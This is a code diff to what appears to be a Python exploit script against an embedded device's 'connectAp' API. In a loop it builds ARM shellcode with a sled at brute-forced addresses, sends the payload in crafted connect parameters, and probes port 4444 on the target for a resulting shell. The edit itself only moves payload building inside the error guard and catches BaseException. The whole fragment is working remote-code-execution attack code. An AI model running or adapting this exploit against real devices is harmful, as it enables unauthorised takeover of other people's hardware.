@@ -91,14 +91,17 @@ def main():
             fired = 0
             while fired < 12:
                 addr = BASE + idx * STEP
-                b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False, hang=True)
-                body = {"method": "connectAp", "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                 try:
+                    # build/params shell out to arm-none-eabi-as and can raise SystemExit,
+                    # which is not an Exception — keep them inside the guard as well
+                    b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False, hang=True)
+                    body = {"method": "connectAp",
+                            "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                     T.req(HOST, sess, body, timeout=8)
                     log(f"{addr:#x} fired")
                     emit("fire", {"addr": hex(addr), "idx": idx})
-                except Exception as e:
-                    log(f"{addr:#x} exc {e}")
+                except BaseException as e:
+                    log(f"{addr:#x} exc {type(e).__name__} {e}")
                 # cheap shell probe between shots
                 try:
                     s = socket.create_connection((HOST, 4444), timeout=1.5)
